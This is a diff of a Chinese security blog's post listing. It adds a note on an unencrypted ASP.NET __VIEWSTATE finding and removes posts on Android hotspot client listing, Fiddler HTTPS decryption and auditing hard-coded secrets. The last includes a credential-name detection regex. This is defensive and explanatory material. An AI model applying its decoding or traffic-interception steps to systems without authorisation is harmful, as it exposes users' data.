+<p>目前官方已发布修复版本修复了该漏洞，请受影响的用户升级到 Apache Commons Configuration 2.8.0 版本。<br><a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-configuration/download_configuration.cgi">https://commons.apache.org/proper/commons-configuration/download_configuration.cgi</a></p>
+</blockquote>
+<h2><span id="参考材料">参考材料</span></h2><blockquote>
+<p>1.<a target="_blank" rel="noopener" href="https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s">https://lists.apache.org/thread/tdf5n7j80lfxdhs2764vn0xmpfodm87s</a><br>2.<a target="_blank" rel="noopener" href="https://cloud.tencent.com/devel">https://cloud.tencent.com/devel</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Plaintext-VIEWSTATE/">
+                未加密的__VIEWSTATE参数
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="未加密的__viewstate参数">未加密的__VIEWSTATE参数</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36292543/article/details/121357450">默默提升实验室</a> 并作补充</p>
+</blockquote>
+<h2><span id="0-知识补充">0. 知识补充</span></h2><blockquote>
+<p>表单提交在遇到服务器返回错误时候，再次填写表单时，上次填写的值不会被清空。</p>
+<p>维持ViewState是ASP.NET Web Forms的默认设置。如果你想不维持ViewState，需在.aspx页面顶部包含提示&lt;%@Page EnableViewState&#x3D;“false” %&gt;，或者或者向任意控件添加属性EnableViewState&#x3D;“false” 。</p>
+<p>没有设置维持ViewState，当点击按钮提交，表单值将消失。</p>
+</blockquote>
+<h3><span id="viewstate是如何使用的">ViewState是如何使用的</span></h3><blockquote>
+<p>ViewState 基本上由服务器生成，并以隐藏的表单字段 “_VIEWSTATE” 的形式发送给客户端，用于“POST”请求。当Web应用程序进行 POST 请求时，客户端将其发送到服务器。</p>
+<p>ViewState 以序列化数据的形式出现，当客户端再次进行请求（ViewState）被发送到服务器时，将进行反序列化。</p>
+<p>为了使 ViewState 不受篡改，存在一个启用 ViewState MAC 的选项，通过设置一个值并在反序列化期间对 ViewState 的值进行完整性检查。</p>
+</blockquote>
+<h2><span id="1-漏洞描述">1. 漏洞描述</span></h2><blockquote>
+<p>__VIEWSTATE 参数未加密，存在有人拦截存储在 ViewState 中的信息的机会。</p>
+</blockquote>
+<h2><span id="2-漏洞危害">2. 漏洞危害</span></h2><blockquote>
+<p>可能导致敏感信息泄露。</p>
+</blockquote>
+<h2><span id="3-漏洞验证">3. 漏洞验证</span></h2><blockquote>
+<p>使用工具：Burp Suit，需要安装插件ViewState Editor，如下图所示：</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/1.png" alt="image"></p>
+<p>POC：{EXTRACTED_STRINGS}:string&#x3D; -2140192582</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/2.png" alt="image"></p>
+<p>查看存在该问题的页面源码，搜索__VIEWSTATE，可以看到对应的value值，对该段值进行base64解码。可以得到对应的信息，在Burp Suit中使用 ViewState Decoder插件可以进行解码。</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/3.png" alt="image"><br><img src="/2023/09/03/Plaintext-VIEWSTATE/4.png" alt="image"></p>
+</blockquote>
+<h3><span id="其他解码工具">其他解码工具</span></h3><blockquote>
+<p>网页：<a target="_blank" rel="noopener" href="https://www.httpdebugger.com/tools/ViewstateDecoder.aspx">https://www.httpdebugger.com/tools/ViewstateDecoder.aspx</a></p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/5.png" alt="image"></p>
+<p>软件：ViewStateDecoder2.0.exe</p>
+<p><img src="/2023/09/03/Plaintext-VIEWSTATE/6.png" alt="image"></p>
+</blockquote>
+<h2><span id="4-漏洞建议">4. 漏洞建议</span></h2><blockquote>
+<p>请将machineKey验证类型设置为AES。这将使得 ASP.NET 使用AES算法加密ViewState 值。</p>
+<p>​打开 Web.Config 并在 &lt;system.web&gt; 元素下添加以下行：<machinekey validation="“AES”/">如下：</machinekey></p>
+<p><code>&lt;system.web&gt; &lt;machinekey validation=&quot;3DES&quot;&gt;&lt;/machinekey&gt;&lt;/system.web&gt;</code></p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/previous-versions/dotnet/netframework-3.0/w8h3skw9%28v=vs.85%29">machineKey 元素（ASP.NET 设置架构）</a></p>
+</blockquote>
+<blockquote>
+<p>关于ViewState的相关demo案例：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/RlY5HL_ak4G8EdcXyevWDg">ViewState 反序列化及其利用</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Plaintext/" rel="tag">Plaintext</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/09/02/CVE-2023-33246-Apache-RocketMQ/">
                 Apache RocketMQ 远程代码执行漏洞（CVE-2023-33246）漏洞分析
             </a>
@@ -372,585 +789,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Session-Key-Exploit/" rel="tag">Session_Key - Exploit</a><a class="tag-none-link" href="/tags/WeChat/" rel="tag">WeChat</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/02/Android-WIFI/">
-                Android 开启个人热点时 获取连接人数以及连接上的设备信息
-            </a>
-        </h2>
-    
-    <time>
-        Sep 2, 2023
-    </time>
-    <section class="content">
-        <h1><span id="android-开启个人热点时-获取连接人数以及连接上的设备信息">Android 开启个人热点时 获取连接人数以及连接上的设备信息</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/king4148/article/details/70156760">多看一二</a> 并作补充</p>
-</blockquote>
-<h2><span id="起因">起因</span></h2><blockquote>
-<p>最近在开发过程当中，遇到一个需求 ，开启个人热点后需要知道有多少人连上了这个热点 以及这些设备的信息</p>
-<p>经过一段时间的摸索和反复的查阅资料，有了下面的代码和解决办法：</p>
-<p>首先 连接热点的所有信息都保存在proc&#x2F;net&#x2F;arp下面 用re文件管理器可以查看一下</p>
-<p>会发现 里面有连接的设备的 ip mac地址 等等  </p>
-<p>好了 那么问题就简单了</p>
-<p>直接贴代码：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">ArrayList&lt;ClientScanResult&gt; result = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/proc/net/arp&quot;</span>));<span class="comment">//读取这个文件</span></span><br><span class="line">    String ss=br.toString();</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        String[] splitted = line.split(<span class="string">&quot; +&quot;</span>);<span class="comment">//将文件里面的字段分割开来</span></span><br><span class="line">        <span class="keyword">if</span> (splitted.length &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="comment">// Basic sanity check</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">mac</span> <span class="operator">=</span> splitted[<span class="number">3</span>];<span class="comment">// 文件中分别是IP address  HW type Flags HW address mask Device </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//然后我们拿取HW address  也就是手机的mac地址进行匹配  如果有 就证明是手机</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mac.matches(<span class="string">&quot;..:..:..:..:..:..&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isReachable</span> <span class="operator">=</span> InetAddress.getByName(splitted[<span class="number">0</span>]).isReachable(reachableTimeout);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!onlyReachables || isReachable) &#123;</span><br><span class="line"></span><br><span class="line">                    result.add(<span class="keyword">new</span> <span class="title class_">ClientScanResult</span>(splitted[<span class="number">0</span>], splitted[<span class="number">3</span>], splitted[<span class="number">5</span>], isReachable));<span class="comment">//最后如果能匹配 那就证明是连接了热点的手机  加到这个集合里 里面有所有需要的信息</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    CandyLog.e(e.getMessage());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (br != <span class="literal">null</span>) &#123;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        CandyLog.e(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientScanResult</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String IpAddr;</span><br><span class="line">    <span class="keyword">private</span> String HWAddr;</span><br><span class="line">    <span class="keyword">private</span> String Device;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> isReachable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClientScanResult</span><span class="params">(String ipAddr, String hWAddr, String device, <span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.IpAddr = ipAddr;</span><br><span class="line">        <span class="built_in">this</span>.HWAddr = hWAddr;</span><br><span class="line">        <span class="built_in">this</span>.Device = device;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getIpAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> IpAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIpAddr</span><span class="params">(String ipAddr)</span> &#123;</span><br><span class="line">        IpAddr = ipAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHWAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> HWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHWAddr</span><span class="params">(String hWAddr)</span> &#123;</span><br><span class="line">        HWAddr = hWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDevice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDevice</span><span class="params">(String device)</span> &#123;</span><br><span class="line">        Device = device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isReachable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setReachable</span><span class="params">(<span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>好了 想要知道连接人数  只要得到集合的size就可以了  又解决一个问题</p>
-<p>关键点在于 热点信息储存在proc&#x2F;net&#x2F;arp 里面  有兴趣的可以了解下proc目录 里面有很多很多信息</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WIFI/" rel="tag">WIFI</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/02/Fiddler-HTTPS/">
-                Fiddler设置解密https的网络数据
-            </a>
-        </h2>
-    
-    <time>
-        Sep 2, 2023
-    </time>
-    <section class="content">
-        <h1><span id="fiddler设置解密https的网络数据">Fiddler设置解密https的网络数据</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38914978/article/details/104801629">Admirer_joker</a> 并作补充</p>
-</blockquote>
-<h2><span id="原理">原理</span></h2><blockquote>
-<p>Fiddler可以通过伪造CA证书来欺骗了浏览器和https服务器。大致原理就是在浏览器面前fiddler伪装成为一个https服务器，而在真正的https服务器面前fiddler又伪装成为浏览器，从而实现解密https数据包的目的；</p>
-</blockquote>
-<h2><span id="步骤">步骤</span></h2><blockquote>
-<p>解密https需要手动开启，步骤如下：</p>
-</blockquote>
-<h3><span id="1-tools-gt-fiddler-options-gt-https">1. Tools –&gt; Fiddler Options –&gt; HTTPS</span></h3><h3><span id="2-打开options-https后如图">2. 打开options-https后，如图：</span></h3><blockquote>
-<p><img src="/2023/09/02/Fiddler-HTTPS/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/09/02/Fiddler-HTTPS/2.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/09/02/Fiddler-HTTPS/3.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Fiddler/" rel="tag">Fiddler</a><a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/07/24/Hard-Coding/">
-                敏捷代码审计之代码硬编码
-            </a>
-        </h2>
-    
-    <time>
-        Jul 24, 2023
-    </time>
-    <section class="content">
-        <h1><span id="敏捷代码审计之代码硬编码">敏捷代码审计之代码硬编码</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://hksanduo.github.io/2022/09/09/2022-09-09-harder-coding-scan/">Sanduo</a> 并作补充</p>
-</blockquote>
-<h2><span id="介绍">介绍</span></h2><blockquote>
-<p>硬编码（英语：Hard Code或Hard Coding）是指在软件编码过程中，将输出或输入的相关参数（例如：路径、输出的形式或格式）直接以常量的方式撰写在源代码中，而非在执行期间由外界指定的设置、资源、资料或格式做出适当回应。一般被认定是种反模式或不完美的实现，因为软件受到输入资料或输出格式的改变就必须修改源代码，对客户而言，改变源代码之外的小设置也许还比较容易。但硬编码的状况也并非完全只有缺陷，因某些封装需要或软件本身的保护措施，有时是必要的手段。除此之外，有时候因应某些特殊的需求，制作出简单的应用程序，应用程序可能只会执行一次或者有限的几次，或者永远只应付某种单一需求。<br>所谓硬编码，就是把一个本来应该（可以）写到配置信息中的信息直接在程序代码中写死了。密钥硬编码在代码中，而根据密钥的用途不同，这导致了不同的安全风险，有的导致加密数据被破解，数据不再保密，有的导致和服务器通信的加签被破解，引发各种血案。</p>
-</blockquote>
-<h2><span id="硬编码检测方法">硬编码检测方法</span></h2><blockquote>
-<p>方法论主要参考：密码密钥硬编码检查，参考链接详见文章末尾。</p>
-</blockquote>
-<h3><span id="鉴别密码密钥方法">鉴别密码密钥方法</span></h3><h4><span id="香农熵shannon-entropy">香农熵(Shannon entropy)</span></h4><blockquote>
-<p>密钥的长度决定了密钥空间(keyspace），通常以位为单位。密钥空间越大，密钥被攻破的难度就越大。<br>密钥是由密钥空间的随机值构成。对于任意一个随机变量 X，它的熵定义如下：</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Hard-Coding/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>变量的不确定性越大，熵也就越大，把它搞清楚所需要的信息量也就越大。</p>
-<ul>
-<li>P(x_i)P(xi) : 指的是单个样本变量所属的变量种类的个数占据所有变量个数的比例。同等长度的字符串，通常密钥的熵值更高</li>
-<li>密钥为避免彩虹攻击，在取值上更加的离散，会尽量采用不重复的字符。就像我们为了增加密码的复杂性，要求长度不小于8，必须包含大小写、特殊字符、以及数字一样的道理。所以密钥的熵值会比一般的文本要高的多。我们就是利用这点来识别字符串是否是密钥。</li>
-</ul>
-</blockquote>
-<h3><span id="工具的检查逻辑">工具的检查逻辑</span></h3><blockquote>
-<p>对于密码密钥的硬编码检查可以采用静态分析工具来完成。工具的检查过程通常包含四个过程：输入文件准备、检查、过滤和报告输出。</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Hard-Coding/2.png" alt="image"></p>
-</blockquote>
-<h4><span id="输入文件分类">输入文件分类</span></h4><blockquote>
-<p>我们需要检查的文本文件进行分类，通常包括以下几种类型：</p>
-<ul>
-<li>程序语言：C、C++、Java、Python、Go、Js等；</li>
-<li>有统一格式的文件：属性文件、yaml、csv、json、xml等；</li>
-<li>文本文件：没有固定格式的文本文件。<br>分类的目的是为了更好的识别文件中的字符串常量，充分利用字符串常量的上下文关联，以便在分析中最大程度的减少误报。</li>
-</ul>
-</blockquote>
-<h4><span id="输入文件转换">输入文件转换</span></h4><blockquote>
-<ul>
-<li>程序语言：通过各语言的语法解析器，解析成抽象语法树，提取语法树中的等于字符串的常量，以及对应的变量名；</li>
-<li>有统一格式的文件：照格式转换成变量名和字符串常量值；</li>
-<li>文本文件：采用token的方式分割成一个个的token，变成一个各的字符串常量。</li>
-</ul>
-</blockquote>
-<h4><span id="密码密钥检查">密码密钥检查</span></h4><blockquote>
-<p>在我们得到大量的变量名和字符串常量后，主要通过正则表达式匹配的方式完成目标的筛选。我们收集的密钥格式包括国内国外主流平台、SDK等相关系统的密钥配置参数名称，可以根据客户的实际情况手动增加和优化规则，进而提高检测的速度和效率。<br>由于检查密码密钥的种类和类型不同，可以通过配置文件来提高检查能力的可扩展性。<br>检查配置选项主要包括以下内容：</p>
-</blockquote>
-<p>|信息	|描述	|<br>|检查类型	|可分为：变量名、字符串常量、或两个都检查	|<br>|密码密钥的类型	|用于区分不同类型的密码密钥；同时用于告警时区分具体检测到的密码密钥类型	|<br>|正则表达式	|主要设定匹配的长度，每个字符的可选类型	|<br>|熵值的阈值	|用于精确的识别密码密钥的类型，降低误报	|</p>
-<blockquote>
-<p>例如：<br>检查硬编码的口令：检查变量名中包含：password、passwd、pwd的变量，且变量等于字符串常量；正则表达式可以设置成为：”.*(password|passwd|pwd)$”。<br>检查GitHub的个人凭证：检查字符串常量；这个凭证是以”ghp_”开头的，跟随长度为36的字符串，且每个字符可以为数字和字母；正则表达式可以设置成为：“ghp_[0-9a-zA-Z]{36}”。</p>
-</blockquote>
-<h4><span id="密码密钥过滤">密码密钥过滤</span></h4><blockquote>
-<p>静态分析能很大程度上减少了人工审核的工作量，但由于检查模式的不确定性，也会带来不少的误报。误报会给用户在审核过程中带来很大的负面情绪，从而不愿继续使用工具。为了进一步降低误报，我们可以通过下面的方式来降低误报：</p>
-<ul>
-<li>密码密钥熵值的计算<br>前面讨论过密码密钥的特点，可以通过检测密码密钥的信息熵的方式来降低误报。有些密码密钥设定了最低的阈值，但还是有很多密码密钥并未给出具体的阈值，这个就需要通过经验积累来设定，目前业界也有通过机器学习来完善这个阈值的设定。</li>
-<li>污点分析<br>在代码中，对于口令的变量的取名上，很多并不会遵守可读性和可维护性来设定变量名，通过前面正则表达式的方式来查找硬编码密码的方式，会造成很多的漏报。这里还可以通过污点分析的方法，来推导出密码是否采用了硬编码。例如检查jdbc连接的密码参数，查看该参数是否为字符串常量。</li>
-</ul>
-</blockquote>
-<h4><span id="报告输出">报告输出</span></h4><blockquote>
-<p>将经过过滤后的结果，输出告警，给出可能泄露的文件名和变量或可能为密码密钥的常量字符串位置，便于人工的排查。</p>
-</blockquote>
-<h2><span id="硬编码检测实战">硬编码检测实战</span></h2><blockquote>
-<p>对于审计人员或者安全管理人员并不需要关注密钥检查的算法，通常只需要选用合适的流程，匹配恰当的工具，迅速准确的定位硬编码即可。</p>
-</blockquote>
-<h3><span id="检查的流程">检查的流程</span></h3><blockquote>
-<p>信息收集：此阶段中，审计人员进行必要的信息收集，包括本次审计要求、稳定版本的源代码。<br>工具审计：确定工具审计的标准和各项配置参数，使用Fortify、gitleaks等工具检测目标源代码，对工具检测的结果进行人工核查，筛选，分析，汇总。<br>人工审计：对客户要求人工审计的重点代码采用人工分析的方法，对源代码中的硬编码进行审计。<br>综合汇总：将工具审计和人工审计的结果进行对比汇总<br>输出报告：此阶段中，审计人员根据测试的结果编写直观的硬编码审计服务报告。<br>源代码硬编码审计要求工作人员有丰富的经验及新颖的思路，同时也是一项比较耗费时间和资源的工作，从效率考虑，一般选择性的抽取部分重要环节的代码进行人工审计。</p>
-</blockquote>
-<h3><span id="开源检查工具">开源检查工具</span></h3><h4><span id="secretscanner">SecretScanner</span></h4><blockquote>
-<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/deepfence/SecretScanner">https://github.com/deepfence/SecretScanner</a><br>SecretScanner可以扫描主机上的容器镜像或本地目录，主要通过正则匹配，扫描效率较高，不仅支持代码而且支持容器扫描，并将结果输出到JSON文件，其中会包含SecretScanner找到的所有敏感数据的详细信息。<br>SecretScanner方便安全人员在主机上收集敏感数据，如果需要审计特定类型代码或者增加新的硬编码检测点，需要手动修改规则，默认配置文件位于项目中的config.yaml，可以根据实际情况自行修改。</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Hard-Coding/3.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>不足：规则数量一般</p>
-</blockquote>
-<h4><span id="gitleaks">gitleaks</span></h4><blockquote>
-<p>Gitleaks为你提供了一种方法来扫描你的git存储库，以查找这些不需要的数据，这些数据应该是私有的，扫描可以自动化，以完全适合CI&#x2F;CD工作流程，以便在密码识别更深入到代码库之前进行识别。<br>gitleaks比较有趣的有以下几点：</p>
-<ul>
-<li>支持私有存储库扫描以及需要基于密钥的身份验证的存储库。</li>
-<li>支持Gitlab批量组织和存储库所有者（用户）存储库扫描，并提取请求扫描以在常见CI工作流中使用。</li>
-<li>支持Pre-Commit，方便研发人员在提交之前进行硬编码检测，防止敏感信息提交。</li>
-<li>支持使用git log命令验证由gitleaks找到的发现</li>
-</ul>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Hard-Coding/4.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>不足：对普通用户友好程度一般，对于pre-commit需要手动配置，并且在大文件扫描效率较低，官方已移除多线程配置参数，使用默认线程数进行扫描，如果在使用过程中感觉缓慢，可自行设定编译。同样规则数量一般，可以根据实际情况添加。</p>
-</blockquote>
-<h4><span id="sasts">SASTs</span></h4><blockquote>
-<p>各种SAST工具都可以检测硬编码，但是受限于使用场景，只能检测较少的硬编码场景，比如password，key等，对于特定的硬编码需要手动增加规则，规则友好性一般。</p>
-</blockquote>
-<h3><span id="硬编码检测规则">硬编码检测规则</span></h3><blockquote>
-<p>无论gitleaks还是secretScanner，均使用正则匹配相关硬编码，敏感信息，我这里整理出部分敏感信息参数，供大家参考，至于规则，按照要求，自行补充即可，比较简单，这里就不单独描述了</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regex: <span class="string">&#x27;(?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]&#123;0,25&#125;)(=|&gt;|:=|\|\|:|&lt;=|=&gt;|:).&#123;0,5&#125;[\&quot;]([0-9a-zA-Z\-_=]&#123;8,64&#125;)[\&quot;]&#x27;</span> </span><br></pre></td></tr></table></figure>
-
-<h2><span id="参考">参考</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://developer.huawei.com/consumer/cn/forum/topic/0204931065040020698?fid=0101592429757310384">密码密钥硬编码检查</a><br><a target="_blank" rel="noopener" href="https://github.com/deepfence/SecretScanner">SecretScanner</a><br><a target="_blank" rel="noopener" href="https://github.com/zricethezav/gitleaks">gitleaks</a><br><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Android%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E4%B9%8B%E6%B5%85%E8%B0%88%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81.html">浅谈密钥硬编码</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/07/24/Python-Telnet/">
-                Python telnet模块说明
-            </a>
-        </h2>
-    
-    <time>
-        Jul 24, 2023
-    </time>
-    <section class="content">
